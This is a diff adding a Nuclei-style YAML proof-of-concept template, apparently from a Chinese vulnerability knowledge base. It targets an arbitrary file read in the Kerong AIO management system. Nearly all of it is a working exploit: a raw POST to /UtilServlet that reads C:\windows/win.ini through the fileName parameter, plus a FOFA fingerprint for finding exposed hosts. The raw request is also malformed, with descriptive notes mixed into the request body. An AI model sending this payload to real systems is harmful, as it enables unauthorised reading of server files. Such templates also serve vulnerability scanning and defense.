@@ -1,0 +1,60 @@
+id: poc-kb3v7p9gkvw81yy4
+info:
+  name: 科荣AIO管理系统文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kb3v7p9gkvw81yy4'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kb3v7p9gkvw81yy4
+    fofa: body="changeAccount('8000')"
+http:
+- raw:
+  - 'POST /UtilServlet HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Cache-Control: no-cache
+
+
+    Pragma: no-cache
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+
+
+    operation=readErrorExcel&fileName=C:\windows/win.ini
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
